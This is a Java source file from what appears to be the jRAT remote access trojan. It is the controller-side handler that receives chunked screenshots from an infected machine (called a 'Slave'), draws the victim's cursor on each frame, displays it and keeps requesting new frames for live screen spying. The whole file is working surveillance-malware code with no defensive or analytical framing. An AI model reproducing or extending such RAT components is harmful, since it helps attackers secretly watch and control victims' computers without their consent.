package io.jrat.client.packets.incoming;

import io.jrat.client.Cursor;
import io.jrat.client.Main;
import io.jrat.client.Slave;
import io.jrat.client.packets.outgoing.Packet12RemoteScreen;
import io.jrat.client.ui.frames.FrameRemoteScreen;
import io.jrat.client.utils.ImageUtils;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;


public class Packet17RemoteScreen extends AbstractIncomingPacket {
		
	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		
		int length = dis.readInt();
		
		int x = dis.readInt();
		int y = dis.readInt();
				
		if (frame != null) {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();

			int read = 0;
			int chunkSize;
			
			frame.getProgressBar().setMaximum(length);

			while ((chunkSize = dis.readInt()) != -1) {
				byte[] chunk = new byte[chunkSize];

				read += chunkSize;

				dis.readFully(chunk);

				baos.write(chunk);
				
				frame.getProgressBar().setValue(read);
			}
			
			byte[] array = baos.toByteArray();
						
			BufferedImage image = ImageUtils.decodeImage(array);
			Cursor.drawCursor(slave.getOS(), image.createGraphics(), x, y);
			image.getGraphics().dispose();
			
			frame.update(image);
			
			frame.getProgressBar().setValue(0);
			
			if (frame.isRunning()) {
				Main.debug("Requesting more");
				slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor()));
			}
		} else {
			int chunkSize;
			while ((chunkSize = dis.readInt()) != -1) {
				dis.readFully(new byte[chunkSize]);			
			}
		}
	}
}
